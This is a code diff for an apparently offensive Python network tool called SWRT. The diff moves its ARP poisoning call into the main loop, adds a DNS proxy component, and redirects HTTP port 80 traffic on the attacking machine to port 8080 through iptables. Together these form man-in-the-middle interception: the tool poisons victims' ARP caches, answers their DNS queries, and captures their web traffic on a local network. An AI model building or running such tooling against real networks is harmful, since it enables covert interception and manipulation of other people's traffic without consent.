@@ -10,6 +10,8 @@ from time import sleep
 import argparse
 from scapy.all import *
 from ArpPoisoner import ArpPoisoner
+from DnsProxy import DnsProxy
+
 
 BLUE = '\033[94m'
 END = '\033[0m'
@@ -76,12 +78,15 @@ if __name__ == "__main__":
 	swrt = SWRT()
 	if (swrt.args.conf != None):
 		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)
-	ArpPoisoner(swrt.args)
+
 	try:
-		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(swrt.args.port))
-		swrt.setup(config)
+		ArpPoisoner(swrt.args)
+		dnsproxy = DnsProxy(config, swrt.args)
+		dnsproxy.start()
+		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(8080))
+
 		while True:
-			sleep(10000)
+			sleep(1)
 	except KeyboardInterrupt:
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		os.system('iptables -t nat -F')
